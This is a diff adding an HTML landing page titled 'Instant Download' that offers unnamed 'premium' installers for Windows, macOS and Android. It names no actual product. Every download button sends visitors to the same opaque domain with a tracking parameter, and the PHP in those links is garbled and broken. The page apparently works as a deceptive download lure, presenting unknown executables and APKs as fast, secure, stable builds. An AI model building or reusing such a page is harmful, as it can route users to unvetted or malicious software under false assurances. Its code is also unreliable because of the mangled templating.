@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instant Download - Premium Downloads</title>
+<meta name="description" content="Fast downloads for Windows, macOS and Android.">
+<meta name="theme-color" content="#0b1020">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+    min-height: 100vh;
+    font-family: "Arial", "Helvetica Neue", sans-serif;
+    color: #f4f7ff;
+    background:
+        radial-gradient(ellipse at 15% 12%, rgba(124,58,237,.22), transparent 34%),
+        radial-gradient(ellipse at 88% 25%, rgba(14,165,233,.16), transparent 32%),
+        linear-gradient(135deg, #090d19, #10172a 52%, #0a1220);
+    overflow-x: hidden;
+}
+
+header {
+    min-height: 72px;
+    padding: 16px 32px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 16px;
+    background: rgba(8,12,25,.86);
+    border-bottom: 1px solid rgba(148,163,184,.18);
+}
+
+.logo {
+    font-size: 20px;
+    font-weight: 900;
+    letter-spacing: -.7px;
+    color: #fff;
+}
+
+.logo span { color: #38bdf8; }
+
+.header-badge, .hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 9px 15px;
+    border: 1px solid rgba(148,163,184,.22);
+    border-radius: 30px;
+    background: rgba(255,255,255,.04);
+    color: #bac7dc;
+    font-size: 11px;
+}
+
+.header-badge span, .hero-badge span {
+    color: #c084fc;
+}
+
+.hero {
+    text-align: center;
+    padding: 58px 20px 48px;
+}
+
+.hero-badge { margin-bottom: 25px; }
+
+.hero h1 {
+    font-size: clamp(34px, 4.5vw, 54px);
+    line-height: 1.08;
+    letter-spacing: -1.8px;
+    font-weight: 900;
+    margin-bottom: 17px;
+}
+
+.line-one {
+    display: block;
+    color: #fff;
+}
+
+.line-two {
+    display: block;
+    background: linear-gradient(90deg, #38bdf8, #818cf8, #c084fc);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+}
+
+.hero-description {
+    max-width: 650px;
+    margin: auto;
+    color: #9aa9c1;
+    font-size: 13px;
+    line-height: 1.8;
+}
+
+.downloads {
+    width: min(1000px, calc(100% - 36px));
+    margin: 0 auto 54px;
+    display: grid;
+    grid-template-columns: repeat(3, minmax(0, 1fr));
+    gap: 18px;
+}
+
+.download-card {
+    position: relative;
+    padding: 22px 20px 20px;
+    min-height: 245px;
+    border-radius: 17px;
+    border: 1px solid rgba(148,163,184,.2);
+    background: linear-gradient(145deg, rgba(28,37,59,.94), rgba(15,23,42,.94));
+    box-shadow: 0 18px 45px rgba(0,0,0,.22);
+    transition: transform .25s, border-color .25s, box-shadow .25s;
+}
+
+.download-card::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 18px;
+    right: 18px;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #38bdf8, transparent);
+}
+
+.download-card:hover {
+    transform: translateY(-5px);
+    border-color: rgba(56,189,248,.45);
+    box-shadow: 0 24px 55px rgba(0,0,0,.32);
+}
+
+.platform-top {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 16px;
+}
+
+.platform-icon {
+    width: 44px;
+    height: 44px;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 12px;
+    background: rgba(255,255,255,.06);
+    border: 1px solid rgba(148,163,184,.15);
+}
+
+.platform-icon svg {
+    width: 23px;
+    height: 23px;
+}
+
+.windows-icon { color: #38bdf8; }
+.mac-icon { color: #f8fafc; }
+.android-icon { color: #4ade80; }
+
+.platform-info small {
+    display: block;
+    color: #5eead4;
+    font-size: 9px;
+    font-weight: 800;
+    letter-spacing: .5px;
+    margin-bottom: 4px;
+}
+
+.platform-info h2 {
+    font-size: 17px;
+    font-weight: 800;
+    color: #f8fafc;
+}
+
+.card-description {
+    color: #a0aec2;
+    font-size: 11px;
+    line-height: 1.8;
+    min-height: 62px;
+    margin-bottom: 12px;
+}
+
+.specs {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 7px;
+    margin-bottom: 15px;
+}
+
+.spec {
+    padding: 6px 9px;
+    border-radius: 7px;
+    border: 1px solid rgba(148,163,184,.2);
+    background: rgba(255,255,255,.035);
+    color: #bdc8da;
+    font-size: 9px;
+}
+
+.download-btn {
+    width: 100%;
+    min-height: 41px;
+    border: 0;
+    border-radius: 9px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    text-decoration: none;
+    cursor: pointer;
+    font-family: inherit;
+    font-size: 11px;
+    font-weight: 800;
+    color: #07111e;
+    background: linear-gradient(135deg, #38bdf8, #818cf8);
+    box-shadow: 0 7px 22px rgba(56,189,248,.15);
+    transition: transform .2s, filter .2s, box-shadow .2s;
+}
+
+.download-btn:hover {
+    transform: translateY(-2px);
+    filter: brightness(1.1);
+    box-shadow: 0 10px 28px rgba(56,189,248,.25);
+}
+
+.download-btn svg {
+    width: 15px;
+    height: 15px;
+}
+
+footer {
+    min-height: 65px;
+    padding: 22px 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    border-top: 1px solid rgba(148,163,184,.15);
+    background: rgba(5,9,19,.55);
+    color: #7f8da5;
+    font-size: 11px;
+}
+
+footer strong { color: #38bdf8; }
+
+@media (max-width: 800px) {
+    .downloads {
+        grid-template-columns: 1fr;
+        max-width: 520px;
+    }
+
+    .download-card { min-height: auto; }
+    .card-description { min-height: auto; }
+}
+
+@media (max-width: 520px) {
+    header { min-height: 64px; padding: 14px 18px; }
+    .logo { font-size: 18px; }
+    .header-badge { display: none; }
+    .hero { padding: 44px 18px 35px; }
+    .hero h1 { font-size: 35px; letter-spacing: -1.2px; }
+    .hero-description { font-size: 12px; }
+    .downloads {
+        width: calc(100% - 28px);
+        gap: 14px;
+        margin-bottom: 36px;
+    }
+    .download-card { padding: 19px; }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="logo">Instant<span>Download</span></div>
+    <div class="header-badge">
+        <span>✦</span> Premium Multi Platform Downloads
+    </div>
+</header>
+
+<main>
+<section class="hero">
+    <div class="hero-badge">
+        <span>✦</span> Premium Multi Platform Downloads
+    </div>
+
+    <h1>
+        <span class="line-one">Fast &amp; Secure</span>
+        <span class="line-two">Instant Download Experience</span>
+    </h1>
+
+    <p class="hero-description">
+        Fast, simple and modern downloads optimized for Windows,
+        macOS and Android devices.
+    </p>
+</section>
+
+<section class="downloads">
+
+    <!-- WINDOWS -->
+    <article class="download-card">
+        <div class="platform-top">
+            <div class="platform-icon windows-icon">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M3 5.2 10.8 4.1v7.5H3V5.2Zm8.8-1.3L21 2.6v9h-9.2V3.9ZM3 12.9h7.8v7.4L3 19.2v-6.3Zm8.8 0H21v8.5l-9.2-1.3v-7.2Z"/>
+                </svg>
+            </div>
+            <div class="platform-info">
+                <small>STABLE BUILD</small>
+                <h2>Windows</h2>
+            </div>
+        </div>
+
+        <p class="card-description">
+            Optimized installer package for Windows with a fast
+            and simple download experience.
+        </p>
+
+        <div class="specs">
+            <span class="spec">64-bit</span>
+            <span class="spec">Windows 10/11</span>
+        </div>
+
+        <a class="download-btn"
+           href="https://frtgyhnbl.help/?z=MzE1&amp;n=<?phpechorawurlencode?>"
+           target="_blank" rel="noopener noreferrer">
+            <svg viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="2.5">
+                <path d="M12 3v12"/>
+                <path d="m7 10 5 5 5-5"/>
+                <path d="M5 21h14"/>
+            </svg>
+            Download for Windows
+        </a>
+    </article>
+
+    <!-- macOS -->
+    <article class="download-card">
+        <div class="platform-top">
+            <div class="platform-icon mac-icon">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M16.7 12.7c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.1-2.7.8-3.4.8-.7 0-1.8-.8-3-.8-1.5 0-2.9.9-3.7 2.3-1.6 2.7-.4 6.6 1.1 8.8.8 1.1 1.6 2.3 2.8 2.3 1.1 0 1.6-.7 3-.7 1.4 0 1.8.7 3 .7 1.2 0 2-.9 2.7-2.1.9-1.3 1.3-2.6 1.3-2.7-.1 0-2.4-.9-2.4-3.3Z"/>
+                    <path d="M14.5 5.9c.6-.7 1-1.7.9-2.7-.9 0-2 .6-2.6 1.3-.6.6-1.1 1.6-1 2.6 1 .1 2-.5 2.7-1.2Z"/>
+                </svg>
+            </div>
+            <div class="platform-info">
+                <small>UNIVERSAL BUILD</small>
+                <h2>macOS</h2>
+            </div>
+        </div>
+
+        <p class="card-description">
+            Universal macOS package designed for Intel and
+            Apple Silicon Mac devices.
+        </p>
+
+        <div class="specs">
+            <span class="spec">M1/M2/M3</span>
+            <span class="spec">Universal</span>
+        </div>
+
+        <a class="download-btn"
+           href="https://frtgyhnbl.help/?z=MzE1&amp;n=<?phpechorawurlencode?>"
+           target="_blank" rel="noopener noreferrer">
+            <svg viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="2.5">
+                <path d="M12 3v12"/>
+                <path d="m7 10 5 5 5-5"/>
+                <path d="M5 21h14"/>
+            </svg>
+            Download for macOS
+        </a>
+    </article>
+
+    <!-- ANDROID -->
+    <article class="download-card">
+        <div class="platform-top">
+            <div class="platform-icon android-icon">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M7.5 8.2 5.8 5.4a.7.7 0 0 1 1.2-.7l1.8 2.9c1-.5 2.1-.7 3.2-.7s2.2.2 3.2.7l1.8-2.9a.7.7 0 1 1 1.2.7l-1.7 2.8c1.8 1 3 2.9 3 5v.7H4.5v-.7c0-2.1 1.2-4 3-5ZM4.5 15h15v3.7c0 .7-.6 1.3-1.3 1.3h-.9v2.1a.7.7 0 1 1-1.4 0V20H8.1v2.1a.7.7 0 1 1-1.4 0V20h-.9c-.7 0-1.3-.6-1.3-1.3V15Zm2.3-4.2a.8.8 0 1 0 0-1.6.8.8 0 0 0 0 1.6Zm10.4 0a.8.8 0 1 0 0-1.6.8.8 0 0 0 0 1.6Z"/>
+                </svg>
+            </div>
+            <div class="platform-info">
+                <small>LATEST APK</small>
+                <h2>Android</h2>
+            </div>
+        </div>
+
+        <p class="card-description">
+            Lightweight Android package optimized for
+            phones and tablets.
+        </p>
+
+        <div class="specs">
+            <span class="spec">Android 8+</span>
+            <span class="spec">APK</span>
+        </div>
+
+        <a class="download-btn"
+           href="https://frtgyhnbl.help/?z=MzE1&amp;n=<?phpechorawurlencode?>"
+           target="_blank" rel="noopener noreferrer">
+            <svg viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="2.5">
+                <path d="M12 3v12"/>
+                <path d="m7 10 5 5 5-5"/>
+                <path d="M5 21h14"/>
+            </svg>
+            Download APK
+        </a>
+    </article>
+
+</section>
+</main>
+
+<footer>
+    © 2026 Instant Download &nbsp;·&nbsp;
+    Built with <strong>&nbsp;Instant Download</strong>
+</footer>
+
+</body>
+</html>
